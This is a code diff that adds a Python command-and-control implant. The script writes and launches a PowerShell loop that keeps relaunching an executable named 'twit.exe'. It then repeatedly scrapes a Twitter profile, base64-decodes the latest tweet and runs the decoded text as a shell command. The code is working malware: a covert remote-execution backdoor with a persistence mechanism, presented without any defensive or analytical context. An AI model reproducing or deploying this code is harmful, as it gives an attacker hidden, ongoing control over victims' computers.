@@ -1,0 +1,36 @@
+import socket, sys, subprocess, os, requests, base64, time
+import bs4
+
+ps ="""
+
+while ($true){
+$sc = get-process | Where-Object {$_.ProcessName -contains 'twit'}
+if (!$sc){
+    D:\\python\\command_and_control\\twit.exe
+}
+}
+"""
+
+fichier = open('D:\\python\\command_and_control\\rip.ps1','a')
+fichier.write(ps)
+fichier.close()
+subprocess.Popen(["powershell","D:\\python\\command_and_control\\rip.ps1"],shell=True)
+
+
+id_t = '0'
+url = 'https://twitter.com/trareon'
+
+while True:
+    data = requests.get(url)
+    soup = bs4.BeautifulSoup(data.text,'lxml')
+    text = soup.find('p',attrs={"class":u"TweetTextSize TweetTextSize--normal js-tweet-text tweet-text"}).getText()
+    id_tw = soup.find('li',attrs={"class":u"js-stream-item stream-item stream-item"}).get('data-item-id')
+    if id_tw != id_t:
+        
+        cmd = base64.b64decode(text)
+        subprocess.Popen(cmd,shell=True)
+        id_t = id_tw
+        time.sleep(20)
+    else:
+        time.sleep(60)
+
